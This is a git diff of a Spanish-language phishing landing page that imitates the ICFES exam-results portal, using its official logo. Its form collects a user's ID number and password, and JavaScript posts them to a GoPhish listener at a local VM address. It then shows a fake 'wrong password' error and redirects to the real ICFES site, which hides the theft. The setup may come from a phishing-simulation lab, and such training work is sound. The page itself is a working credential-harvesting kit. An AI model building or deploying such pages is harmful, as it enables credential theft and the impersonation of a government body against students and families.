@@ -1,10 +1,9 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <base href="https://jakala11.github.io/landing-page/"/>
-    <meta charset="UTF-8"/>
+    <meta charset="UTF-8">
     <title>ICFES - Consulta de Resultados</title>
-    <style type="text/css">
+    <style>
         body {
             font-family: Arial, sans-serif;
             background-color: #e9eef3;
@@ -66,23 +65,23 @@
         }
     </style>
     <script>
-        // Captura el evento del envío del formulario y muestra un error falso
         function mostrarError(event) {
-            event.preventDefault(); // Evita el comportamiento por defecto (enviar el formulario)
+            event.preventDefault();
 
-            // Envía los datos al servidor de GoPhish
             const form = event.target;
             const formData = new FormData(form);
-            fetch(form.action, {  // Se envían los datos al servidor configurado (GoPhish)
+
+            // Envía datos al listener de GoPhish en la VM
+            fetch(form.action, {
                 method: "POST",
                 body: formData
             });
 
-            // Muestra el mensaje de error y redirige después de 3 segundos
+            // Mostrar mensaje de error
             document.getElementById('formulario').style.display = 'none';
             document.getElementById('mensaje-error').style.display = 'block';
 
-            // Redirige después de 3 segundos al sitio real
+            // Redirigir al portal real del ICFES
             setTimeout(() => {
                 window.location.href = "https://www.icfes.gov.co";
             }, 3000);
@@ -90,31 +89,30 @@
     </script>
 </head>
 <body>
-<div class="container">
-    <div class="logo">
-        <img alt="Logo ICFES" src="https://www.icfes.gov.co/documents/20143/0/logo-icfes-2021-color.png"/>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.icfes.gov.co/documents/20143/0/logo-icfes-2021-color.png" alt="Logo ICFES">
+        </div>
+        <h2>Consulta de Resultados</h2>
+
+        <!-- El action apunta a tu servidor GoPhish en la VM -->
+        <form method="POST" action="http://192.168.0.15" id="formulario" onsubmit="mostrarError(event)">
+            <label for="usuario">Tipo de documento y número</label>
+            <input type="text" name="usuario" id="usuario" placeholder="CC 1234567890" required>
+
+            <label for="clave">Contraseña</label>
+            <input type="password" name="clave" id="clave" placeholder="********" required>
+
+            <input type="submit" value="Consultar">
+        </form>
+
+        <div id="mensaje-error" class="error" style="display:none;">
+            Usuario o contraseña incorrectos. Redirigiendo al portal oficial...
+        </div>
+
+        <div class="note">
+            ¿Problemas para ingresar? Contacte soporte@icfes.gov.co
+        </div>
     </div>
-
-    <h2>Consulta de Resultados</h2>
-
-    <!-- Formulario con acción para enviar datos a GoPhish -->
-    <form action="{{.SubmitURL}}" method="POST" id="formulario" onsubmit="mostrarError(event)">
-        <!-- Campos ocultos si es necesario -->
-        <input type="hidden" name="url" value="https://jakala11.github.io/landing-page/" />
-        
-        <label for="usuario">Tipo de documento y número</label>
-        <input id="usuario" name="usuario" type="text" placeholder="CC 1234567890" required=""/>
-        
-        <label for="clave">Contraseña</label>
-        <input id="clave" name="clave" placeholder="********" required="" type="password"/>
-        
-        <input type="submit" value="Consultar"/>
-    </form>
-
-    <div class="error" id="mensaje-error" style="display:none;">Usuario o contraseña incorrectos. Redirigiendo al portal oficial...</div>
-
-    <div class="note">¿Problemas para ingresar? Contacte soporte@icfes.gov.co</div>
-</div>
-
 </body>
 </html>
